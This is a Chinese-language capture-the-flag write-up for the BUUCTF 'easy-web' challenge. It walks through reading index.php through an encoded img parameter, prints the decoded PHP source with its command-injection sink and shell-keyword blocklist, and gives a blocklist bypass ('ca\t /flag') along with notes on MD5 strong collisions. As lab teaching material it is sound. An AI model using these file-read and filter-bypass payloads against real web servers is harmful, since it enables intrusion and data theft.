# T12 easy-web

> 题目：BUUCTF 

__0x00 审题__
```
/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=  (来自url中)
```
先对img进行base64解密，然后发现其为十六进制，最终得到img=555.png，就是旁边的图

__0x01 解题__

1. 根据之前555.png的加密原理，倒推加密index.php

构造：
```
?img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&cmd= //img 中是index.php两次加密的结果
```

得到F12中：

```
data:image/gif;base64,PD9waHAKZXJyb3JfcmVwb3J0aW5nKEVfQUxMIHx8IH4gRV9OT1RJQ0UpOwpoZWFkZXIoJ2NvbnRlbnQtdHlwZTp0ZXh0L2h0bWw7Y2hhcnNldD11dGYtOCcpOwokY21kID0gJF9HRVRbJ2NtZCddOwppZiAoIWlzc2V0KCRfR0VUWydpbWcnXSkgfHwgIWlzc2V0KCRfR0VUWydjbWQnXSkpIAogICAgaGVhZGVyKCdSZWZyZXNoOjA7dXJsPS4vaW5kZXgucGhwP2ltZz1UWHBWZWs1VVRURk5iVlV6VFVSYWJFNXFZejAmY21kPScpOwokZmlsZSA9IGhleDJiaW4oYmFzZTY0X2RlY29kZShiYXNlNjRfZGVjb2RlKCRfR0VUWydpbWcnXSkpKTsKCiRmaWxlID0gcHJlZ19yZXBsYWNlKCIvW15hLXpBLVowLTkuXSsvIiwgIiIsICRmaWxlKTsKaWYgKHByZWdfbWF0Y2goIi9mbGFnL2kiLCAkZmlsZSkpIHsKICAgIGVjaG8gJzxpbWcgc3JjID0iLi9jdGYzLmpwZWciPic7CiAgICBkaWUoInhpeGnvvZ4gbm8gZmxhZyIpOwp9IGVsc2UgewogICAgJHR4dCA9IGJhc2U2NF9lbmNvZGUoZmlsZV9nZXRfY29udGVudHMoJGZpbGUpKTsKICAgIGVjaG8gIjxpbWcgc3JjPSdkYXRhOmltYWdlL2dpZjtiYXNlNjQsIiAuICR0eHQgLiAiJz48L2ltZz4iOwogICAgZWNobyAiPGJyPiI7Cn0KZWNobyAkY21kOwplY2hvICI8YnI+IjsKaWYgKHByZWdfbWF0Y2goIi9sc3xiYXNofHRhY3xubHxtb3JlfGxlc3N8aGVhZHx3Z2V0fHRhaWx8dml8Y2F0fG9kfGdyZXB8c2VkfGJ6bW9yZXxiemxlc3N8cGNyZXxwYXN0ZXxkaWZmfGZpbGV8ZWNob3xzaHxcJ3xcInxcYHw7fCx8XCp8XD98XFx8XFxcXHxcbnxcdHxccnxceEEwfFx7fFx9fFwofFwpfFwmW15cZF18QHxcfHxcXCR8XFt8XF18e3x9fFwofFwpfC18PHw+L2kiLCAkY21kKSkgewogICAgZWNobygiZm9yYmlkIH4iKTsKICAgIGVjaG8gIjxicj4iOwp9IGVsc2UgewogICAgaWYgKChzdHJpbmcpJF9QT1NUWydhJ10gIT09IChzdHJpbmcpJF9QT1NUWydiJ10gJiYgbWQ1KCRfUE9TVFsnYSddKSA9PT0gbWQ1KCRfUE9TVFsnYiddKSkgewogICAgICAgIGVjaG8gYCRjbWRgOwogICAgfSBlbHNlIHsKICAgICAgICBlY2hvICgibWQ1IGlzIGZ1bm55IH4iKTsKICAgIH0KfQoKPz4KPGh0bWw+CjxzdHlsZT4KICBib2R5ewogICBiYWNrZ3JvdW5kOnVybCguL2JqLnBuZykgIG5vLXJlcGVhdCBjZW50ZXIgY2VudGVyOwogICBiYWNrZ3JvdW5kLXNpemU6Y292ZXI7CiAgIGJhY2tncm91bmQtYXR0YWNobWVudDpmaXhlZDsKICAgYmFja2dyb3VuZC1jb2xvcjojQ0NDQ0NDOwp9Cjwvc3R5bGU+Cjxib2R5Pgo8L2JvZHk+CjwvaHRtbD4=
```

好长一串，进行base64解密得到

```
<?php
error_reporting(E_ALL || ~ E_NOTICE);
header('content-type:text/html;charset=utf-8');
$cmd = $_GET['cmd'];
if (!isset($_GET['img']) || !isset($_GET['cmd'])) 
    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');
$file = hex2bin(base64_decode(base64_decode($_GET['img'])));

$file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);
if (preg_match("/flag/i", $file)) {
    echo '<img src ="./ctf3.jpeg">';
    die("xixi～ no flag");
} else {
    $txt = base64_encode(file_get_contents($file));
    echo "<img src='data:image/gif;base64," . $txt . "'></img>";
    echo "<br>";
}
echo $cmd;
echo "<br>";
if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) {
    echo("forbid ~");
    echo "<br>";
} else {
    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {
        echo `$cmd`;
    } else {
        echo ("md5 is funny ~");
    }
}

?>
```

* 这里我们看到了源码跟我们的初步猜测相同，接下来就是关于过滤了一堆东西和MD5

2. 处理问题

> 问题一：如何过滤

已知最后输出是cmd中的内容所以我们需要让cmd=flag,可以去看根目录一步一步来，但是凭借我不多的经验，其中一定含有flag.php,所以直接尝试

> 由于cat等很多被过滤

```
ca\t%20/flag
```
> 也可以考虑：查根目录：dir；用sort代替cat

 ***

> 问题二：关于MD5强碰撞

* 注：之前只绕过过MD5弱比较，强碰撞什么的没见过（新生研讨寄）

[关于强碰撞](https://xz.aliyun.com/t/2232),[关于如何使用fastcall](https://blog.csdn.net/shuaicenglou3032/article/details/118197904)


__0x02 总结__

1. 常见的过滤
2. 关于MD5强碰撞，其中几个问题：

> 问题一:关于fastcall的原理目前没有看懂
> 问题二：不知道为什么看大佬都可以轻松得解，我用fastcall的exe文件却打不开呢

